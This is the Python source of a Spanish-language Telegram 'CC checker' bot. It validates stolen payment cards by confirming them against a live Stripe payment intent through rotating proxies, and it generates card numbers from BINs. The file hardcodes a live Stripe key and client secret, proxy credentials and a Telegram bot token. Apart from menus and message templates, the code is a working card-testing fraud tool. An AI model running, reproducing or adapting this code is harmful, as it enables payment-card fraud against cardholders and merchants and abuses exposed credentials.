import logging
from logging import Handler, handlers
from multiprocessing import context
import os
from signal import Handlers
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import string
import random
from turtle import update

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint



from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup


##
uniproxy = requests.session()
uniproxy.proxies = uniproxy 
##

proxys = {
    'http':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https': 'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}


comand = "/.,+*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)

button1 = InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", callback_data="creador")
button2 = InlineKeyboardButton(text="𝗚𝗮𝘁𝗲𝘀", callback_data="gate")
button3 = InlineKeyboardButton(text="𝐌𝐢 𝐂𝐚𝐧𝐚𝐥", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)

admins = [5646865373, 5646865373, 5646865373]



@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
async def random_value(call: types.CallbackQuery):
    if call.data == "creador":
        await call.message.answer("☘ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 ☘: @DiegoAkk")
    if call.data == "gate":
        await call.message.answer("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: <b>Stripe Auth 1</b> | <b>Status: Off</b> ❌        
🟡 [🝂] /stp: <b>Stripe Auth 2</b> | <b>Status: Off</b> ❌
🔴 [🝂] /pene: <b>Stripe Charged 25$ Auth</b> | <b>Status: On</b> ✅    
                        
                        """)
    elif call.data == "randomvalue_of10":
        await call.message.answer("❇𝗠𝗶 𝗖𝗮𝗻𝗮𝗹 𝗲𝘀 𝗲𝘀𝘁𝗲 𝗽𝗼𝗿 𝘀𝗶 𝗾𝘂𝗶𝗲𝗿𝗲𝘀 𝗲𝗻𝘁𝗿𝗮𝗿:𝟯: @BlacKBullCanal❇")
    await call.answer()


########################## COMDANDO START ################################


@iniciar.message_handler(commands=['start'], commands_prefix=comand)
async def start_answer(message: types.Message):
    await message.answer_photo('https://imgur.com/ZO72OAT', "𝑩𝒊𝒆𝒏𝒗𝒆𝒏𝒊𝒅𝒐 𝒂 𝒀𝒐𝒊𝒎𝒊𝒚𝒂𝑪𝒉𝒌𝑩𝒐𝒕, 𝒎𝒊 𝒄𝒓𝒆𝒂𝒅𝒐𝒓 𝒆𝒔 @𝑫𝒊𝒆𝒈𝒐𝑨𝑲𝑲. 𝑸𝒖𝒆 𝒍𝒂 𝒑𝒂𝒔𝒆𝒔 𝒓𝒊𝒄𝒐", reply_markup=keyboard_inline)


########################## FIN COMANDO START ################################


########################## COMANDO CMDS ################################


@iniciar.message_handler(commands=["cmds"], commands_prefix=comand)
async def cmds(message: types.Message):
    cmd = await message.reply("<b>𝕰𝖘𝖙𝖔𝖘 𝖘𝖔𝖓 𝖒𝖎𝖘 𝖈𝖔𝖒𝖆𝖓𝖉𝖔𝖘 𝖇𝖇 </b>")
    time.sleep(1)
    await cmd.edit_text("""
 ☘ 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔 ☘
━━━━━━━━━━━━━━
[🝂] /cmds ✅
[🝂] /gates ✅
━━━━━━━━━━━━━━
𝑻𝒐𝒐𝒍𝒔 ⚒
━━━━━━━━━━━━━━
[🝂] /bin ✅
[🝂] /gen ✅
[🝂] /sk ✅
━━━━━━━━━━━━━━
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
                        """)
                        
########################## FIN COMANDO CMDS ################################




########################## COMDANDO GATES ################################
boton = InlineKeyboardButton(text="𝗔𝘂𝘁𝗵", callback_data="Auth")
boton2 = InlineKeyboardButton(text="𝗖𝗵𝗮𝗿𝗴𝗲𝗱", callback_data="charged")
keyboard_inlin3 = InlineKeyboardMarkup().add(boton, boton2)

@iniciar.callback_query_handler(text=["Auth", "charged"])
async def random_valu3(call: types.CallbackQuery):
    if call.data == "Auth":
        await call.message.answer("""[ϟ] G̲a̲t̲e̲s̲ ̲A̲u̲t̲h̲:

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] <code>/auth: cc|mes|ano|cvv</code>
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: <b>Off ❌</b>
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: <b>Stripe Auth 1 [FREE]</b>
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <b>Stripe</b>
    
- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] <code>/stp: cc|mes|ano|cvv</code>
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: <b>Off ❌</b>
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: <b>Stripe Auth 2 [PREMIUM]</b>
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <b>Stripe</b>""")
    if call.data == "charged":
        await call.message.answer("""[ϟ] 𝘎𝘢𝘵𝘦𝘴 𝘊𝘩𝘢𝘳𝘨𝘦𝘥:

[🝂] 𝘐𝘯𝘱𝘶𝘵: [🝂] <code>/pene: cc|mes|ano|cvv</code>
[🝂] 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: <b>On</b> ✅
[🝂] 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: <b>Stripe Charged 25$ [PREMIUM]</b>
[🝂] 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <b>Stripe</b>""")

    await call.answer()

@iniciar.message_handler(commands=["gates"], commands_prefix=comand)
async def gates(message: types.Message):
    cmd = await message.reply("<b>LISTA DE GATES @YoimiyaChkBot UwU </b>", reply_markup=keyboard_inlin3)
    time.sleep(1)

########################## FIN COMANDO GATES ################################

#𝗜𝗻𝗴𝗿𝗲𝘀𝗲 𝗯𝗶𝗲𝗻 𝗲𝗹 𝗯𝗶𝗻 𝗼𝗺𝗲 𝗴𝗲𝗶, 𝘁𝗶𝗽𝗼 𝗮𝘀� 
########################## INFO BIN ################################

@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>Ingresa el bin asi</b>: /bin 431231")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    bin1 = await message.reply(f"<b>💳CHEKEANDO BIN: {BIN}\nᴄᴀʀɢᴀɴᴅᴏ: [20%]</b>")
    apis1 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={BIN}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis1['status']
    banke=apis1['bank']
    bank=banke['name']
    brand=apis1['brand']
    bn=apis1['query']
    typ=apis1['type']
    lv=apis1['level']
    country1=apis1['country']
    country=country1['name']
    
    
    bin2 = await bin1.edit_text(f"<b>💳CHEKEANDO BIN: {BIN}\nᴄᴀʀɢᴀɴᴅᴏ: [70%]</b>")
    time.sleep(3)
    bin3 = await bin2.edit_text(f"<b>💳CHEKEANDO BIN: {BIN}\nᴄᴀʀɢᴀɴᴅᴏ: [100%]</b>")
    
    if ID in admins :
        await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: <code>{bn}</code>
[Ϟ] <b>Vendor</b>: <code>{brand}</code>
[Ϟ] <b>Type</b>: <code>{typ}</code>
[Ϟ] <b>Level</b>: <code>{lv}</code>
[Ϟ] <b>Bank</b>: <code>{bank}</code>
[Ϟ] <b>Country</b>: <code>{country}</code>
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
""")

    else:
        await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: <code>{bn}</code>
[Ϟ] <b>Vendor</b>: <code>{brand}</code>
[Ϟ] <b>Type</b>: <code>{typ}</code>
[Ϟ] <b>Level</b>: <code>{lv}</code>
[Ϟ] <b>Bank</b>: <code>{bank}</code>
[Ϟ] <b>Country</b>: <code>{country}</code>
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
𝗕𝗼𝘁 𝗕𝘆: @DiegoAkk
""")

########################## FIN INFO BIN ################################



 ################## GATE AUTH ######################################   

@iniciar.message_handler(commands=["auth"], commands_prefix=comand)
async def auth(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/auth '):]
    ccs1 = ccs
    if not ccs1:
        await message.reply("<b>Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>")
    
@iniciar.message_handler(commands=['stp'], commands_prefix=comand)
async def da(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('<b>Efectivamente tienes premium bb✅ | Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>')
    
    else:
        await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/stp '):]
    
    if not ccs:
        await contra.edit_text("<b>Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>")



@iniciar.message_handler(commands=['pene'], commands_prefix=comand)  
async def pene(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')
    
    else:
        await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/pene '):]   

    if not ccs:
        await contra.edit_text("🔴 [🝂] /pene: <b>Stripe Charged 25$</b> | <b>Status: On</b> ✅")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")

    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']

    final = time.perf_counter()

    dat4 = f'receipt_email=djfjdjffj%40gmail.com&payment_method_data[type]=card&payment_method_data[billing_details][email]=djfjdjffj%40gmail.com&payment_method_data[billing_details][name]=dd&payment_method_data[billing_details][address][postal_code]=10081&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=e97f7c39-c716-4d6f-9bcf-567d84a828419950f7&payment_method_data[muid]=a2e62b85-15c5-4dd1-be12-03b1db1a2396be9b77&payment_method_data[sid]=0c3ac9c2-17e9-43a0-9bba-cb1174e25c5e83d67d&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&payment_method_data[time_on_page]=499164&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_DzYuDiszHWOjwN44sVfaT41s&client_secret=pi_3MbaLOJeGhFfMJgC1jwsOBWM_secret_pLuyaWQpQqSY8B7mabt9q0mTY'

    headels = {
    'authority': 'api.stripe.com',
    'method': 'POST',
    'path': '/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm',
    'scheme': 'https',
    'accept': 'application/json',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'es-ES,es;q=0.9',
    'content-length': '953',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    #ec-ch-ua': 'Chromium";v="110", 'Not A(Brand;v='24', 'Google Chrome';v='110',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': 'Windows',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    
    }
    
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    time.sleep(1)

    session = requests.session()

    api201 = session.post("https://api.stripe.com/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm", headers=headels, data=dat4).json()
    
    ko = api201["error"]["code"]
    msgg = api201["error"]["message"]

    if 'Your card was declined.' in msgg:
        if ID in admins :
                        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 25$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{ccs}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        else:
            await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 25$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{ccs}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    if 'invalid_cvc' in ko:
         await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 25$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{ccs}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's security code is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
          
      
    if 'invalid_expiry_year' in ko: 
         await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 25$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{ccs}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's expiration year is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    if 'Your card number is incorrect.' in msgg:
         await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 25$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{ccs}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card number is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    if 'Your card has insufficient funds.' in msgg:
         await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 25$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{ccs}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card has insufficient funds.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>

[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>

[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")




@iniciar.message_handler(commands=['gen'], commands_prefix=comand)   
async def rnd(message: types.Message):
    ccs = message.text[len('/gen '):]
    if not ccs:
        return await message.reply(
            f"""
            𝗜𝗻𝗴𝗿𝗲𝘀𝗮 𝗯𝗶𝗲𝗻 𝗲𝗹 𝗯𝗶𝗻 𝗴𝗲𝗶, 𝗮𝘀𝗶: /bin 431231""")

    text = f"""CCS GEN"""
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    splitter = ccs.split('|')
    #bincode1 = 12
    cc = splitter[0]
    mes = 'rnd'
    ano = 'rnd'
    cvv = 'rnd'

    if len (splitter[0]) < 6 or len(splitter[0]) > 16:
        await message.reply("""BIN INCORRECTO PNDJ PERO IGUAL TE GENRARE CCS""")
    if len (splitter) == 2:
        cc = splitter[0]
        mes = splitter[1]
        ano = 'rnd'
        cvv = 'rnd'
    if len (splitter) == 3:
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvv = 'rnd'
    if len (splitter) == 4:
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvv = splitter[3]
    amount = '10'
    ccs1 = []
    ccs2 = []
    ccs3 = []
    ccs4 = []
    ccs5 = []
    ccs6 = []
    ccs7 = []
    ccs8 = []
    ccs9 = []

    s="0123456789"
    uno = list(s)
    random.shuffle(uno)
    result = ''.join(uno)
    result = cc + result
    if cc[0] == "3":
        ccgen = result[0:15]
    else:
        ccgen = result[0:16]
    if mes == 'rnd':
        mesgen = random.randint(1,12)
        if len(str(mesgen)) == 1:
            mesgen = "0" + str(mesgen)
    else:
        mesgen = mes
    if ano == 'rnd':
        anogen = random.randint(2023,2030)
    else:
        anogen = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen = random.randint(1000,9999)
        else:
            cvvgen = random.randint(100,999)
    else:
        cvvgen = cvv


    s="0123456789"
    dos = list(s)
    random.shuffle(dos)
    result = ''.join(dos)
    result = cc + result
    if cc[0] == "3":
        ccgen2 = result[0:15]
    else:
        ccgen2 = result[0:16]
    if mes == 'rnd':
        mesgen2 = random.randint(1,12)
        if len(str(mesgen2)) == 1:
            mesgen2 = "0" + str(mesgen2)
    else:
        mesgen2 = mes
    if ano == 'rnd':
        anogen2 = random.randint(2023,2030)
    else:
        anogen2 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen2 = random.randint(1000,9999)
        else:
            cvvgen2 = random.randint(100,999)
    else:
        cvvgen2 = cvv
    

    s="0123456789"
    tres = list(s)
    random.shuffle(tres)
    result = ''.join(tres)
    result = cc + result
    if cc[0] == "3":
        ccgen3 = result[0:15]
    else:
        ccgen3 = result[0:16]
    if mes == 'rnd':
        mesgen3 = random.randint(1,12)
        if len(str(mesgen3)) == 1:
            mesgen3 = "0" + str(mesgen3)
    else:
        mesgen3 = mes
    if ano == 'rnd':
        anogen3 = random.randint(2023,2030)
    else:
        anogen3 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen3 = random.randint(1000,9999)
        else:
            cvvgen3 = random.randint(100,999)
    else:
        cvvgen3 = cvv

    s="0123456789"
    cuatro = list(s)
    random.shuffle(cuatro)
    result = ''.join(cuatro)
    result = cc + result
    if cc[0] == "3":
        ccgen4 = result[0:15]
    else:
        ccgen4 = result[0:16]
    if mes == 'rnd':
        mesgen4 = random.randint(1,12)
        if len(str(mesgen4)) == 1:
            mesgen4 = "0" + str(mesgen4)
    else:
        mesgen4 = mes
    if ano == 'rnd':
        anogen4 = random.randint(2023,2030)
    else:
        anogen4 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen4 = random.randint(1000,9999)
        else:
            cvvgen4 = random.randint(100,999)
    else:
        cvvgen4 = cvv

    s="0123456789"
    sinco = list(s)
    random.shuffle(sinco)
    result = ''.join(sinco)
    result = cc + result
    if cc[0] == "3":
        ccgen5 = result[0:15]
    else:
        ccgen5 = result[0:16]
    if mes == 'rnd':
        mesgen5 = random.randint(1,12)
        if len(str(mesgen5)) == 1:
            mesgen5 = "0" + str(mesgen5)
    else:
        mesgen5 = mes
    if ano == 'rnd':
        anogen5 = random.randint(2023,2030)
    else:
        anogen5 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen5 = random.randint(1000,9999)
        else:
            cvvgen5 = random.randint(100,999)
    else:
        cvvgen5 = cvv
    
    s="0123456789"
    seis = list(s)
    random.shuffle(seis)
    result = ''.join(seis)
    result = cc + result
    if cc[0] == "3":
        ccgen6 = result[0:15]
    else:
        ccgen6 = result[0:16]
    if mes == 'rnd':
        mesgen6 = random.randint(1,12)
        if len(str(mesgen6)) == 1:
            mesgen6 = "0" + str(mesgen6)
    else:
        mesgen6 = mes
    if ano == 'rnd':
        anogen6 = random.randint(2023,2030)
    else:
        anogen6 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen6 = random.randint(1000,9999)
        else:
            cvvgen6 = random.randint(100,999)
    else:
        cvvgen6 = cvv

    s="0123456789"
    siete = list(s)
    random.shuffle(siete)
    result = ''.join(siete)
    result = cc + result
    if cc[0] == "3":
        ccgen7 = result[0:15]
    else:
        ccgen7 = result[0:16]
    if mes == 'rnd':
        mesgen7 = random.randint(1,12)
        if len(str(mesgen7)) == 1:
            mesgen7 = "0" + str(mesgen7)
    else:
        mesgen7 = mes
    if ano == 'rnd':
        anogen7 = random.randint(2023,2030)
    else:
        anogen7 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen7 = random.randint(1000,9999)
        else:
            cvvgen7 = random.randint(100,999)
    else:
        cvvgen7 = cvv

    s="0123456789"
    ocho = list(s)
    random.shuffle(ocho)
    result = ''.join(ocho)
    result = cc + result
    if cc[0] == "3":
        ccgen8 = result[0:15]
    else:
        ccgen8 = result[0:16]
    if mes == 'rnd':
        mesgen8 = random.randint(1,12)
        if len(str(mesgen8)) == 1:
            mesgen8 = "0" + str(mesgen8)
    else:
        mesgen8 = mes
    if ano == 'rnd':
        anogen8 = random.randint(2023,2030)
    else:
        anogen8 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen8 = random.randint(1000,9999)
        else:
            cvvgen8 = random.randint(100,999)
    else:
        cvvgen8 = cvv

    s="0123456789"
    nueve = list(s)
    random.shuffle(nueve)
    result = ''.join(nueve)
    result = cc + result
    if cc[0] == "3":
        ccgen9 = result[0:15]
    else:
        ccgen9 = result[0:16]
    if mes == 'rnd':
        mesgen9 = random.randint(1,12)
        if len(str(mesgen9)) == 1:
            mesgen9 = "0" + str(mesgen9)
    else:
        mesgen9 = mes
    if ano == 'rnd':
        anogen9 = random.randint(2023,2030)
    else:
        anogen9 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen9 = random.randint(1000,9999)
        else:
            cvvgen9 = random.randint(100,999)
    else:
        cvvgen9 = cvv
    
    s="0123456789"
    diez = list(s)
    random.shuffle(diez)
    result = ''.join(diez)
    result = cc + result
    if cc[0] == "3":
        ccgen10 = result[0:15]
    else:
        ccgen10 = result[0:16]
    if mes == 'rnd':
        mesgen10 = random.randint(1,12)
        if len(str(mesgen10)) == 1:
            mesgen10 = "0" + str(mesgen10)
    else:
        mesgen10 = mes
    if ano == 'rnd':
        anogen10 = random.randint(2023,2030)
    else:
        anogen10 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen10 = random.randint(1000,9999)
        else:
            cvvgen10 = random.randint(100,999)
    else:
        cvvgen10 = cvv

    
    lista = str(ccgen) +"|" + str(mesgen) +"|" + str(anogen) +"|" + str(cvvgen)
    lista2 = str(ccgen2) +"|" + str(mesgen2) +"|" + str(anogen2) +"|" + str(cvvgen2)
    lista3 = str(ccgen3) +"|" + str(mesgen3) +"|" + str(anogen3) +"|" + str(cvvgen3)
    lista4 = str(ccgen4) +"|" + str(mesgen4) +"|" + str(anogen4) +"|" + str(cvvgen4)
    lista5 = str(ccgen5) +"|" + str(mesgen5) +"|" + str(anogen5) +"|" + str(cvvgen5)
    lista6 = str(ccgen6) +"|" + str(mesgen6) +"|" + str(anogen6) +"|" + str(cvvgen6)
    lista7 = str(ccgen7) +"|" + str(mesgen7) +"|" + str(anogen7) +"|" + str(cvvgen7)
    lista8 = str(ccgen8) +"|" + str(mesgen8) +"|" + str(anogen8) +"|" + str(cvvgen8)
    lista9 = str(ccgen9) +"|" + str(mesgen9) +"|" + str(anogen9) +"|" + str(cvvgen9)
    lista10 = str(ccgen10) +"|" + str(mesgen10) +"|" + str(anogen10) +"|" + str(cvvgen10)

    ccs.join(lista)
    cc1 = ''.join(lista2)
    cc2 = ''.join(lista3)
    cc3 = ''.join(lista4)
    cc4 = ''.join(lista5)
    cc5 = ''.join(lista6)
    cc6 = ''.join(lista7)
    cc7 = ''.join(lista8)
    cc8 = ''.join(lista9)
    cc9 = ''.join(lista10)

    cards = ''.join(ccs)
    cards2 = ''.join(cc2)
    cards3 = ''.join(cc3)
